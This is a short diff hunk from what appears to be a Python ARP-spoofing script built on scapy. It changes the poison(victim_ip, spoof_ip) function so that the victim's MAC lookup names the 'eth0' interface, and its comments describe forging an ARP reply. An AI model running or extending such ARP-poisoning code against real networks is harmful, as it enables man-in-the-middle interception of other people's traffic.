@@ -7,7 +7,7 @@ def poison(victim_ip, spoof_ip):
     '''Change mac address in arp table'''
 
     # Get victim host ip address using previously created function
-    victim_mac = get_target_mac(victim_ip)
+    victim_mac = get_target_mac(victim_ip, 'eth0')
 
     # Create the ARP packet, scapy will add your MAC address for hwsrc
     # op=2 means that ARP is going to send answer 
